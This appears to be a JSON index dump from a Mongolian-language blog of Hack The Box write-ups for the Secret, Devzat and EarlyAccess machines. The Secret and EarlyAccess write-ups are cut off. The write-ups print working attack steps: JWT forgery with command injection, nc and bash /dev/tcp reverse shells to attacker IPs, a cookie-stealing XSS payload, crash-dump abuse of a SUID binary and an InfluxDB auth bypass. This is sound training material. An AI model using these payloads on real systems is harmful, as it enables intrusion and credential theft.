jwttool_cbf8204ec14c30927f8819921cb0c4ec - Tampered token - HMAC Signing: [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M Admin эсэх шалгах:\ncurl http://secret.htb/api/priv -H \u0026#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M\u0026#39; {\u0026#34;creds\u0026#34;:{\u0026#34;role\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;theadmin\u0026#34;,\u0026#34;desc\u0026#34;:\u0026#34;welcome back admin\u0026#34;}} Admin мөн байсан. passwd log?file= ашиглан шалгах:\ncurl \u0026#39;http://secret.htb/api/logs?file=/etc/passwd\u0026#39; -H \u0026#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M\u0026#39; {\u0026#34;killed\u0026#34;:false,\u0026#34;code\u0026#34;:128,\u0026#34;signal\u0026#34;:null,\u0026#34;cmd\u0026#34;:\u0026#34;git log --oneline /etc/passwd\u0026#34;}┌ 5. Exploitation curl \u0026#39;http://secret.htb/api/logs?file=;id\u0026#39; -H \u0026#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M\u0026#39; \u0026#34;80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\u0026#34; dasith\ncurl via RCE payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.10 9001 \u0026gt;/tmp/f CyperChef URL Encoded:\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff 5.1 Reverse Shell nc -lvnp 9001 curl \u0026#39;http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E10%209001%20%3E%2Ftmp%2Ff\u0026#39; -H \u0026#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBmNTZlMGFlMGM5NzA0NWU3MGQwMTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUxNzI2OTR9.9atPnYQ9Vorv3rT4p54ngJiypMXVQXayPLOOppuxA2o\u0026#39; 5.2 Shell balance python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 5.3 user.txt id:\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith) user.txt:\n762a20********** 5.4 linpeas.sh` /tmp /tmp/crash-report /tmp/crash-report/Architecture /tmp/crash-report/CoreDump /tmp/crash-report/CoreDump/Architecture /tmp/crash-report/CoreDump/CoreDump /tmp/crash-report/CoreDump/Date /tmp/crash-report/CoreDump/DistroRelease /tmp/crash-report/CoreDump/ExecutablePath #)You_can_write_even_more_files_inside_last_directory /tmp/crash-report/CrashCounter /tmp/crash-report/Date /tmp/crash-report/DistroRelease /tmp/crash-report/ExecutablePath /tmp/crash-report/ExecutableTimestamp #)You_can_write_even_more_files_inside_last_directory 6. Enumeration find / -type f -perm -u=s 2\u0026gt;/dev/null cd /opt Out:\ndrwxr-xr-x 2 root root 4096 Oct 7 10:06 . drwxr-xr-x 20 root root 4096 Oct 7 15:01 .. -rw-r--r-- 1 root root 3736 Oct 7 10:01 code.c -rw-r--r-- 1 root root 16384 Oct 7 10:01 .code.c.swp -rwsr-xr-x 1 root root 17824 Oct 7 10:03 count -rw-r--r-- 1 root root 4622 Oct 7 10:04 valgrind.log count, code.c\nssh keygen local дээр үүсгэнэ:\nssh-keygen -t rsa -b 4096 -C \u0026#39;drt@htb\u0026#39; -f secret.htb -P \u0026#39;\u0026#39; secret.hub.pub\nssh-rsa AAAAB3NzaC1yc2EAAAA********************xiPOw== ca@htb хуулах auth_key (machine vm)\nssh -i secret.htb dasith@10.10.11.120 хоёр ssh нээнэ\nssh 1:\ndasith@secret:/opt$ ./count -p Enter source file/directory name: /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y Path: ssh 2:\ndasith@secret:/opt$ ps -aux | grep count root 824 0.0 0.1 235676 7472 ? Ssl Feb19 0:01 /usr/lib/accountsservice/accounts-daemon dasith 3417 0.0 0.0 2488 576 pts/2 S+ Feb19 0:00 ./count dasith 4596 0.0 0.0 2488 588 pts/4 S+ 05:28 0:00 ./count -p dasith 4606 0.0 0.0 6432 736 pts/5 S+ 05:28 0:00 grep --color=auto count kill -BUS 4596 tmp дотор caca нэртэй фолдер үүсгээд дотор нь unpack хийнэ:\napport-unpack _opt_count.1000.crash /tmp/caca dasith@secret:/tmp/caca$ ls -la total 444 drwxrwxr-x 2 dasith dasith 4096 Feb 20 05:32 . drwxrwxrwt 15 root root 4096 Feb 20 05:32 .. -rw-rw-r-- 1 dasith dasith 5 Feb 20 05:32 Architecture -rw-rw-r-- 1 dasith dasith 380928 Feb 20 05:32 CoreDump -rw-rw-r-- 1 dasith dasith 1 Feb 20 05:32 CrashCounter -rw-rw-r-- 1 dasith dasith 24 Feb 20 05:32 Date -rw-rw-r-- 1 dasith dasith 12 Feb 20 05:32 DistroRelease -rw-rw-r-- 1 dasith dasith 10 Feb 20 05:32 ExecutablePath -rw-rw-r-- 1 dasith dasith 10 Feb 20 05:32 ExecutableTimestamp -rw-rw-r-- 1 dasith dasith 2 Feb 20 05:32 _LogindSession -rw-rw-r-- 1 dasith dasith 5 Feb 20 05:32 ProblemType -rw-rw-r-- 1 dasith dasith 7 Feb 20 05:32 ProcCmdline -rw-rw-r-- 1 dasith dasith 4 Feb 20 05:32 ProcCwd -rw-rw-r-- 1 dasith dasith 97 Feb 20 05:32 ProcEnviron -rw-rw-r-- 1 dasith dasith 2144 Feb 20 05:32 ProcMaps -rw-rw-r-- 1 dasith dasith 1335 Feb 20 05:32 ProcStatus -rw-rw-r-- 1 dasith dasith 2 Feb 20 05:32 Signal -rw-rw-r-- 1 dasith dasith 29 Feb 20 05:32 Uname -rw-rw-r-- 1 dasith dasith 3 Feb 20 05:32 UserGroups strings CoreDump Root.txt\n8599fb********* ","permalink":"https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/","summary":"1. IP Address # Machine Address 10.10.11.120 # Local Address 10.10.14.140 2. Nmap \u0026amp; Nikto 2.1 Nmap nmap -sV -sC -oA nmap/secret 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 01:24 EST Nmap scan report for 10.10.11.120 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.","title":"HTB - Secret"},{"content":"1. IP Address # Machine хаяг 10.10.11.118 # Local хаяг 10.10.14.140 2. Nmap nmap -sV -sC -oA nmap/devzat 10.10.11.118 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 03:09 EST Nmap scan report for 10.10.11.118 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://devzat.htb/ 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.91%I=7%D=2/17%Time=620E02E2%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.28 seconds 22 tcp ssh 80 http 8000 tcp ssh\n3. Nikto nikto -h 10.10.11.118 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.11.118 + Target Hostname: 10.10.11.118 + Target Port: 80 + Start Time: 2022-02-17 03:11:03 (GMT-5) --------------------------------------------------------------------------- + Server: Apache/2.4.41 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Root page / redirects to: http://devzat.htb/ + No CGI Directories found (use \u0026#39;-C all\u0026#39; to force check all possible dirs) нэмэх /etc/hosts -\u0026gt; devzat.htb\n4. Gobuster gobuster dir -u http://devzat.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://devzat.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/17 03:20:16 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 309] [--\u0026gt; http://devzat.htb/images/] /assets (Status: 301) [Size: 309] [--\u0026gt; http://devzat.htb/assets/] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://devzat.htb/javascript/] Progress: 31191 / 220561 (14.14%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2022/02/17 03:32:56 Finished =============================================================== 5. Ffuf ffuf -c -u http://devzat.htb/ -H \u0026#34;Host: FUZZ.devzat.htb\u0026#34; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -mc: Match HTTP status codes, or \u0026ldquo;all\u0026rdquo; for everything. (default: 200,204,301,302,307,401,403,405,500)\n________________________________________________ :: Method : GET :: URL : http://devzat.htb/ :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.devzat.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ pets [Status: 200, Size: 510, Words: 20, Lines: 21] :: Progress: [4989/4989] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:33] :: Errors: 0 :: нэмэх pets.devzat.htb -\u0026gt; /etc/hosts\nfuf -u http://pets.devzat.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -fs 510 -fs: Filter HTTP response size. Comma separated list of sizes and ranges\nv1.3.1 ________________________________________________ :: Method : GET :: URL : http://pets.devzat.htb/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 510 ________________________________________________ css [Status: 301, Size: 40, Words: 3, Lines: 3] build [Status: 301, Size: 42, Words: 3, Lines: 3] server-status [Status: 403, Size: 280, Words: 20, Lines: 10] .git [Status: 301, Size: 41, Words: 3, Lines: 3] :: Progress: [43003/43003] :: Job [1/1] :: 165 req/sec :: Duration: [0:04:24] :: Errors: 0 :: .git\n6. .Git dumber and Extract ##Download Gittools: # https://github.com/internetwache/GitTools/releases/tag/v0.0.1 tar zxvf gitTools-v0.0.1.tgz Dumper:\ngitdumper.sh http://pets.devzat.htb/.git/ pets Extractor:\n./extractor.sh pets pets_dump total 0 drwxr-xr-x 1 ca4mi ca4mi 252 Feb 17 04:41 . drwxr-xr-x 1 ca4mi ca4mi 114 Feb 17 04:42 .. drwxr-xr-x 1 ca4mi ca4mi 160 Feb 17 04:41 0-ef07a04ebb2fc92cf74a39e0e4b843630666a705 drwxr-xr-x 1 ca4mi ca4mi 160 Feb 17 04:41 1-8274d7a547c0c3854c074579dfc359664082a8f6 drwxr-xr-x 1 ca4mi ca4mi 160 Feb 17 04:41 2-464614f32483e1fde60ee53f5d3b4d468d80ff62 main.go\nfunc loadCharacter(species string) string { cmd := exec.Command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;cat characteristics/\u0026#34;+species) stdoutStderr, err := cmd.CombinedOutput() if err != nil { return err.Error() } return string(stdoutStderr) } 7. Reverse Shell sudo tcpdump -i tun0 icmp Output:\n05:20:18.743591 IP devzat.htb \u0026gt; 10.10.14.140: ICMP echo request, id 4, seq 354, length 64 05:20:18.743613 IP 10.10.14.140 \u0026gt; devzat.htb: ICMP echo reply, id 4, seq 354, length 64 05:20:19.202056 IP devzat.htb \u0026gt; 10.10.14.140: ICMP echo request, id 2, seq 428, length 64 05:20:19.202078 IP 10.10.14.140 \u0026gt; devzat.htb: ICMP echo reply, id 2, seq 428, length 64 05:20:19.245840 IP devzat.htb \u0026gt; 10.10.14.140: ICMP echo request, id 6, seq 112, length 64 05:20:19.245862 IP 10.10.14.140 \u0026gt; devzat.htb: ICMP echo reply, id 6, seq 112, length 64 05:20:19.432060 IP devzat.htb \u0026gt; 10.10.14.140: ICMP echo request, id 1, seq 1547, length 64 05:20:19.432137 IP 10.10.14.140 \u0026gt; devzat.htb: ICMP echo reply, id 1, seq 1547, length 64 base64 руу:\n## Base64 руу хөрвүүлөх echo -n \u0026#39;bash -i\u0026gt;\u0026amp; /dev/tcp/10.10.14.140/9001 0\u0026gt;\u0026amp;1\u0026#39; | base64 ## /хуулах/ YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0MC85MDAxIDA+JjE= ## 9001 port дээр сонсох nc -lvnp 9001 Burp дээр req барин base64 -d хийх:\nPOST /api/pet HTTP/1.1 Host: pets.devzat.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://pets.devzat.htb/ Content-Type: text/plain;charset=UTF-8 Origin: http://pets.devzat.htb Content-Length: 82 DNT: 1 Connection: close Sec-GPC: 1 {\u0026#34;name\u0026#34;:\u0026#34;fg\u0026#34;,\u0026#34;species\u0026#34;:\u0026#34;cat; echo -n YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0MC85MDAxIDA+JjE= | base64 -d | bash\u0026#34;} id:\npatrick@devzat:~/pets id uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) 7.1 Shell balance: python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm catherine\n8. Exploitation Local VM:\n# http сервер асаах python3 -m http.server Machine VM:\n8.1 linpeas curl 10.10.14.140:8000/linpeas.sh -o linpeas.sh ## chmod +x linpeas.sh Үр дүнд:\n╔══════════╣ Active Ports ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 898/./petshop tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::8000 :::* LISTEN 897/./devchat 8.2 Chisel ### Download chisel_1.7.7_linux_amd64.gz ## unzip gzip -d chisel_1.7.7_linux_amd64.gz mv chisel_1.7.7_linux_amd64 chisel chmod +x chisel ## curl to Machine VM curl 10.10.14.140:8000/chisel -o chisel Local VM:\n./chisel server -p 3477 --reverse 2022/02/17 06:27:13 server: Reverse tunnelling enabled 2022/02/17 06:27:13 server: Fingerprint IXk1H0yZ/WxP4FYsKS66U8CMaC7XAZgNC/Lh84a3XkI= 2022/02/17 06:27:13 server: Listening on http://0.0.0.0:3477 2022/02/17 06:27:38 server: session#1: tun: proxy#R:8086=\u0026gt;8086: Listening Machine VM:\n./chisel client 10.10.14.140:3477 R:8086:127.0.0.1:8086 patrick@devzat:/tmp$ ./chisel client 10.10.14.140:3477 R:8086:127.0.0.1:8086 2022/02/17 11:27:37 client: Connecting to ws://10.10.14.140:3477 2022/02/17 11:27:39 client: Connected (Latency 239.707911ms) 8.3 Nmap scan: nmap -p 8086 -sV 127.0.0.1 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 06:29 EST Nmap scan report for localhost (127.0.0.1) Host is up (0.0076s latency). PORT STATE SERVICE VERSION 8086/tcp open http InfluxDB http admin 1.7.5 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds 8.4 CVE-2019-20933 Host (default: localhost): Port (default: 8086): Username \u0026lt;OR\u0026gt; path to username file (default: users.txt): /opt/SecLists/Usernames/Names/names.txt [v] admin Host vulnerable !!! Databases: 1) devzat 2) _internal .quit to exit [admin@127.0.0.1] Database: devzat Starting InfluxDB shell - .back to go back [admin@127.0.0.1/devzat] $ SELECT * FROM \u0026ldquo;user\u0026rdquo;:\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;series\u0026#34;: [ { \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;enabled\u0026#34;, \u0026#34;password\u0026#34;, \u0026#34;username\u0026#34; ], \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;values\u0026#34;: [ [ \u0026#34;2021-06-22T20:04:16.313965493Z\u0026#34;, false, \u0026#34;WillyWonka2021\u0026#34;, \u0026#34;wilhelm\u0026#34; ], [ \u0026#34;2021-06-22T20:04:16.320782034Z\u0026#34;, true, \u0026#34;woBeeYareedahc7Oogeephies7Aiseci\u0026#34;, \u0026#34;catherine\u0026#34; ], [ \u0026#34;2021-06-22T20:04:16.996682002Z\u0026#34;, true, \u0026#34;RoyalQueenBee$\u0026#34;, \u0026#34;charles\u0026#34; ] ] } ], \u0026#34;statement_id\u0026#34;: 0 } ] } su - catherine woBeeYareedahc7Oogeephies7Aiseci user.txt:\n433d81****** 9. Enumeration linpeas.sh\n#)You_can_write_even_more_files_inside_last_directory /var/backups/devzat-dev.zip /var/backups/devzat-main.zip /var/crash /var/tmp /var/backups/devzat-dev.zip /var/backups/devzat-main.zip Unzip:\nunzip devzat-dev.zip unzip devzat-main.zip # 2 ижил файлаас юу нь ялгаатай байгааг шалгах diff main/commands.go dev/commands.go Output:\n\u0026gt; // Check my secure password \u0026gt; if pass != \u0026#34;CeilingCatStillAThingIn2021?\u0026#34; { \u0026gt; u.system(\u0026#34;You did provide the wrong password\u0026#34;) \u0026gt; return \u0026gt; } ssh -l test localhost -p 8443 root.txt\nfd3fb39c********** ","permalink":"https://cadil.github.io/posts/2024-03-01-htb-devzat-writeup/","summary":"1. IP Address # Machine хаяг 10.10.11.118 # Local хаяг 10.10.14.140 2. Nmap nmap -sV -sC -oA nmap/devzat 10.10.11.118 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 03:09 EST Nmap scan report for 10.10.11.118 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Devzat"},{"content":"1. IP Address # Machine Address 10.10.11.110 # Local Address 10.10.14.12 2. Nmap CLI:\nnmap -sV -sC -oA nmap/early_access 10.10.11.110 Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 02:20 EST Nmap scan report for 10.10.11.110 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA) | 256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA) |_ 256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519) 80/tcp open http Apache httpd 2.4.38 |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Did not follow redirect to https://earlyaccess.htb/ 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: EarlyAccess | ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT | Not valid before: 2021-08-18T14:46:57 |_Not valid after: 2022-08-18T14:46:57 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.44 seconds 3. XSS XXS change username: username:\n\u0026lt;script\u0026gt;var i=new Image;i.src=\u0026#34;https://10.10.14.7/443\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; VM-с http асаах:\n# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/ # generate server.pem with the following command: # openssl req -new -x509 -keyout key.pem -out server.pem -days 365 -nodes # run as follows: # python simple-https-server.py # then in your browser, visit: # https://localhost:4443 import http.server import ssl server_address = (\u0026#39;10.10.14.7\u0026#39;, 443) httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=\u0026#34;server.pem\u0026#34;, keyfile=\u0026#34;key.pem\u0026#34;, ssl_version=ssl.PROTOCOL_TLS) httpd.serve_forever() python3 listener:\n\u0026#34;GET /443XSRF-TOKEN=eyJpdiI6InBNMm9FV3Frd1hqOVJSem1BbjFHckE9PSIsInZhbHVlIjoid05TbWpTRHowTWRKemlvdjZHaytITTFNU2xnckFmK2dOTWhHc0grdlRWbU9SK280V0hydGdVMjZjUjI5OFFtekVabWRPZnlJTWxEK0hLd1hJa1pIb1RGcTUzQ0pzOVpNYmw1RHdIZjJRY09peFV6K3JBS1dPYjVSS3M3OVBieC8iLCJtYWMiOiIyMTFiNzIzYjBlNWQ3M2E5NzliYTdmNzJlMmE2MTNmZDAxZTAxN2Q5YzJkNWU2OGFlNjYyYTVlYjYzYzQ5NzM1In0%3D;%20earlyaccess_session=eyJpdiI6IjU2ekxPNmNDdkdna1BnQkh4YkFlcUE9PSIsInZhbHVlIjoiSld1SXhmUkh0dzZUemREYU1uejZnU2ZHZVRBakJrbTE2bStvd2M1dUZqdFNza01vdzExM0IvdHJSdE53Ym90R1FqMXhwT0piQ3RlcFA4Mi9FNkNSc1kxTEQvUUMzZFl6ak9CemZtU0kvZUY0cDJXVHpXNTh6MFhOZmZVZmJ6ZlYiLCJtYWMiOiJjODI4NTc2NDE1MmJmNmQwMDE4ZmE5MTJlNWRhYzBiZGM1Y2IyMTI2NmVhYmYxODY4YzkwZjEwMDk2Y2UwYzE3In0%3D HTTP/1.1\u0026#34; 404 - XSRF-TOKEN\neyJpdiI6InBNMm9FV3Frd1hqOVJSem1BbjFHckE9PSIsInZhbHVlIjoid05TbWpTRHowTWRKemlvdjZHaytITTFNU2xnckFmK2dOTWhHc0grdlRWbU9SK280V0hydGdVMjZjUjI5OFFtekVabWRPZnlJTWxEK0hLd1hJa1pIb1RGcTUzQ0pzOVpNYmw1RHdIZjJRY09peFV6K3JBS1dPYjVSS3M3OVBieC8iLCJtYWMiOiIyMTFiNzIzYjBlNWQ3M2E5NzliYTdmNzJlMmE2MTNmZDAxZTAxN2Q5YzJkNWU2OGFlNjYyYTVlYjYzYzQ5NzM1In0%3D 20earlyaccess_session:\neyJpdiI6IjU2ekxPNmNDdkdna1BnQkh4YkFlcUE9PSIsInZhbHVlIjoiSld1SXhmUkh0dzZUemREYU1uejZnU2ZHZVRBakJrbTE2bStvd2M1dUZqdFNza01vdzExM0IvdHJSdE53Ym90R1FqMXhwT0piQ3RlcFA4Mi9FNkNSc1kxTEQvUUMzZFl6ak9CemZtU0kvZUY0cDJXVHpXNTh6MFhOZmZVZmJ6ZlYiLCJtYWMiOiJjODI4NTc2NDE1MmJmNmQwMDE4ZmE5MTJlNWRhYzBiZGM1Y2IyMTI2NmVhYmYxODY4YzkwZjEwMDk2Y2UwYzE3In0%3D 4. Exploitation Cookie солиод харвал админ панел, http://dev.earlyaccess.htb/ subdomain харагдаж байна. backup.zip дотор vaildate.py байгаа. Generate Key хийж байгаа. group1-group2-group3-group4-group5\n#!/usr/bin/env python3 import sys from re import match class Key: key = \u0026#34;\u0026#34; magic_value = \u0026#34;XP\u0026#34; # Static (same on API) magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min) def __init__(self, key:str, magic_num:int=346): self.key = key if magic_num != 0: self.magic_num = magic_num @staticmethod def info() -\u0026gt; str: return f\u0026#34;\u0026#34;\u0026#34; # Game-Key validator # Can be used to quickly verify a user\u0026#39;s game key, when the API is down (again). Keys look like the following: AAAAA-BBBBB-CCCC1-DDDDD-1234 Usage: {sys.argv[0]} \u0026lt;game-key\u0026gt;\u0026#34;\u0026#34;\u0026#34; def valid_format(self) -\u0026gt; bool: return bool(match(r\u0026#34;^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$\u0026#34;, self.key)) def calc_cs(self) -\u0026gt; int: gs = self.key.split(\u0026#39;-\u0026#39;)[:-1] return sum([sum(bytearray(g.encode())) for g in gs]) def g1_valid(self) -\u0026gt; bool: g1 = self.key.split(\u0026#39;-\u0026#39;)[0] r = [(ord(v)\u0026lt;\u0026lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])] if r != [221, 81, 145]: return False for v in g1[3:]: try: int(v) except: return False return len(set(g1)) == len(g1) def g2_valid(self) -\u0026gt; bool: g2 = self.key.split(\u0026#39;-\u0026#39;)[1] p1 = g2[::2] p2 = g2[1::2] return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode())) def g3_valid(self) -\u0026gt; bool: # TODO: Add mechanism to sync magic_num with API g3 = self.key.split(\u0026#39;-\u0026#39;)[2] if g3[0:2] == self.magic_value: return sum(bytearray(g3.encode())) == self.magic_num else: return False def g4_valid(self) -\u0026gt; bool: return [ord(i)^ord(g) for g, i in zip(self.key.split(\u0026#39;-\u0026#39;)[0], self.key.split(\u0026#39;-\u0026#39;)[3])] == [12, 4, 20, 117, 0] def cs_valid(self) -\u0026gt; bool: cs = int(self.key.split(\u0026#39;-\u0026#39;)[-1]) return self.calc_cs() == cs def check(self) -\u0026gt; bool: if not self.valid_format(): print(\u0026#39;Key format 